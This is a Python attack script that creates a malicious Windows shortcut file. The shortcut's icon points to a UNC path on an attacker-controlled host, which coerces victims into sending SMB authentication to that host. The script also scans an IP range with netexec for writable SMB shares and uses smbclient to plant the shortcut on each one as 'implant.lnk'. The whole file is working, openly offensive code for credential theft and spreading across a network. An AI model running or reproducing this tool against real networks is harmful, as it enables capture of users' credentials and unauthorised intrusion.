from __future__ import print_function
import argparse
import os
import random
import sys
from datetime import datetime
import subprocess

# Check if we're running on a Windows platform
is_windows = sys.platform.startswith('win')

# Import platform-specific libraries for LNK file creation
if is_windows:
    import win32com.client  # Windows-specific for creating LNK files using COM objects
else:
    try:
        import pylnk3 as pylnk  # pylnk3 for LNK creation on non-Windows platforms
    except ImportError:
        # If pylnk3 is not installed on non-Windows, exit the program
        print("You must install liblnk's python bindings for non-windows machines!")
        sys.exit(1)


banner = r"""

 ________                                                   __     
|        \                                                 |  \    
 \$$$$$$$$______        __  _______    ______    _______  _| $$_   
   | $$  |      \      |  \|       \  /      \  /       \|   $$ \  
   | $$   \$$$$$$\      \$$| $$$$$$$\|  $$$$$$\|  $$$$$$$ \$$$$$$  
   | $$  /      $$     |  \| $$  | $$| $$  | $$ \$$    \   | $$ __ 
   | $$ |  $$$$$$$     | $$| $$  | $$| $$__/ $$ _\$$$$$$\  | $$|  \
   | $$  \$$    $$     | $$| $$  | $$ \$$    $$|       $$   \$$  $$
    \$$   \$$$$$$$__   | $$ \$$   \$$  \$$$$$$  \$$$$$$$     \$$$$ 
                 |  \__/ $$                                        
                  \$$    $$                                        
                   \$$$$$$                                         

"""

# Function to parse command-line arguments
def parse_cmd_line_args():
    """
    This function is responsible for handling and parsing command-line arguments.
    It uses argparse to define the required and optional parameters for the script.
    
    Returns:
        argparse.Namespace: Parsed command-line arguments object.
    """
    parser = argparse.ArgumentParser(description='Generate a LNK payload and upload to SMB shares')
    parser.add_argument("--target-range", required=True, help="Target IP range for SMB scanning (e.g., 192.168.131.0/24)")
    parser.add_argument("--username", required=True, help="Username for SMB authentication")
    parser.add_argument("--password", required=True, help="Password for SMB authentication")
    parser.add_argument("--domain", help="Domain for SMB authentication (use only if domain auth is required)")
    parser.add_argument("--local-auth", action='store_true', help="Use --local-auth for SMB authentication")
    parser.add_argument("--host", required=True, help="Where to send data (attacker's IP)")
    parser.add_argument("--output", required=True, help="The name of the lnk file")
    parser.add_argument("--execute", nargs='+', default=[r'C:\Windows\explorer.exe .'], help="Command executed when the shortcut is clicked")
    parser.add_argument("--targets-file", default="/home/kali/targets.txt", help="Path to save found SMB targets")
    return parser.parse_args()

# Function to create the LNK file (shortcut)
def create_lnk_file(args):
    """
    This function creates a .lnk (shortcut) file on either Windows or non-Windows systems.
    For Windows, it uses the `win32com.client` module to create the LNK file, while for non-Windows
    platforms it uses `pylnk3`.

    Args:
        args (argparse.Namespace): Parsed command-line arguments.
    
    Prints:
        A success message with the location of the created LNK file and its associated icon path.
    """
    # Join the execute command into a single string if multiple commands are passed
    target = ' '.join(args.execute)

    # Create a unique icon path for the shortcut using a UNC path (for network icon)
    icon = r'\\{host}\Share\{filename}.ico'.format(
        host=args.host,
        filename=random.randint(0, 50000)  # Random filename for the icon
    )

    if is_windows:
        # Windows-specific LNK creation using WScript Shell COM object
        ws = win32com.client.Dispatch('wscript.shell')
        link = ws.CreateShortcut(args.output)
        link.Targetpath = r'C:\Windows\System32'  # Set the shortcut's target path
        link.Arguments = 'cmd.exe /c ' + target  # Set command to be executed when clicked
        link.IconLocation = icon  # Assign the random UNC icon path
        link.save()  # Save the shortcut
    else:
        # Non-Windows LNK creation using pylnk3
        lnk = pylnk.create(args.output)
        lnk.target = r'C:\Windows\System32\cmd.exe'  # Target path
        lnk.arguments = '/c ' + target  # Command to execute
        lnk.icon = icon  # Icon path
        lnk.save(args.output)  # Save the LNK file

    print(f"LNK file created at {args.output} with UNC path {icon}.")

# Function to create a LNK file based on a target file (For non-Windows systems)
def for_file(target_file, lnk_name=None):
    """
    Creates a LNK file with more control over the file metadata such as creation time, access time, etc.
    This is intended for non-Windows systems using pylnk3.

    Args:
        target_file (str): The target file that the LNK file will point to.
        lnk_name (str): Optional name for the LNK file being created.

    Returns:
        pylnk.Lnk: The generated LNK object.
    """
    now = datetime.now()
    lnk = pylnk.create(lnk_name)

    # Set the LNK file's target and metadata
    lnk.target = target_file  # Set the target of the LNK file
    lnk.working_dir = os.path.dirname(target_file)  # Set the working directory
    lnk.relative_path = target_file  # Set the relative path to the target
    lnk.icon = 'path_to_icon.ico'  # Set the icon (optional)
    lnk.create_time = now  # Set the creation time
    lnk.access_time = now  # Set the access time
    lnk.write_time = now  # Set the write time

    return lnk

# Function to scan SMB shares
def scan_smb_shares(target_ip_range, username, password, domain, local_auth, output_file):
    """
    Scans the SMB shares within the specified IP range and identifies writeable shares.
    It uses `netexec` to perform the scan and filters results to save writeable targets.

    Args:
        target_ip_range (str): The IP range to scan for SMB shares.
        username (str): SMB username for authentication.
        password (str): SMB password for authentication.
        domain (str): Optional domain for authentication.
        local_auth (bool): Whether to use local authentication.
        output_file (str): Path to save the found targets.

    Returns:
        bool: True if valid SMB shares are found, False otherwise.
    """
    print("Scanning SMB shares...")
    auth_flag = '--local-auth' if local_auth else f"-W {domain}"  # Set domain or local authentication flag
    command = f"netexec smb {target_ip_range} -u {username} -p '{password}' {auth_flag} --shares"  # Construct the SMB scan command

    # Run the command and capture the output
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if result.returncode != 0:
        # If the scan fails, print the error and exit
        print(f"Error running netexec: {result.stderr}")
        return False

    # Parse the result to identify writeable SMB shares
    targets = []
    for line in result.stdout.splitlines():
        if "WRITE" in line:
            fields = line.split()
            if len(fields) > 5:
                targets.append(f"{fields[1]} {fields[4]}")  # Extract relevant fields for the share

    # Save the found SMB shares to the targets file
    with open(output_file, 'w') as f:
        for target in targets:
            f.write(target + "\n")

    if not targets:
        # If no writeable shares are found, notify the user
        print("No valid SMB shares found.")
        return False

    print(f"Targets saved to {output_file}")
    return True

# Function to upload the .lnk file to the found SMB shares
def upload_to_shares(targets_file, lnk_file, username, password, domain):
    """
    Uploads the generated LNK file to each of the found SMB shares.

    Args:
        targets_file (str): Path to the file containing the found SMB shares.
        lnk_file (str): Path to the LNK file that will be uploaded.
        username (str): SMB username for authentication.
        password (str): SMB password for authentication.
        domain (str): Optional domain for authentication.

    Returns:
        bool: True if the file was successfully uploaded, False otherwise.
    """
    print("Uploading .lnk file to SMB shares...")
    if not os.path.exists(targets_file):
        # If the targets file is missing, print an error and exit
        print(f"Targets file not found: {targets_file}")
        return False

    # Read the targets file line by line and attempt to upload the LNK file to each share
    with open(targets_file, 'r') as f:
        for line in f:
            fields = line.split()
            if len(fields) < 2:
                print(f"Invalid target format: {line}")
                continue

            # Construct the target SMB share path
            combined_target = f"{fields[0]}/{fields[1]}"
            destination = f"//{combined_target}/implant.lnk"

            print(f"Uploading {lnk_file} to {destination}")
            if domain:
                # Use domain-based authentication if provided
                smb_command = f"smbclient //{combined_target} -W {domain} -U {username}%{password} -c 'put {lnk_file} implant.lnk'"
            else:
                # Use local authentication if domain is not specified
                smb_command = f"smbclient //{combined_target} -U {username}%{password} -c 'put {lnk_file} implant.lnk'"

            # Execute the SMB command to upload the file
            upload_result = subprocess.run(smb_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if upload_result.returncode == 0:
                print(f"Successfully uploaded {lnk_file} to {destination}")
            else:
                print(f"Failed to upload to {destination}: {upload_result.stderr}")

    return True

# Main function that ties all steps together
def main():
    """
    The main function orchestrates the workflow of the script:
    1. Parse the command-line arguments.
    2. Create the LNK file based on user inputs.
    3. Scan for SMB shares within the specified IP range.
    4. Upload the generated LNK file to the discovered SMB shares.
    """
    args = parse_cmd_line_args()  # Step 1: Parse command-line arguments
    print(banner)

    # Step 2: Create the .lnk file
    create_lnk_file(args)

    # Step 3: Scan for SMB shares and save to targets file
    if scan_smb_shares(args.target_range, args.username, args.password, args.domain, args.local_auth, args.targets_file):
        # Step 4: Upload the .lnk file to the found SMB shares
        upload_to_shares(args.targets_file, args.output, args.username, args.password, args.domain)

if __name__ == "__main__":
    main()
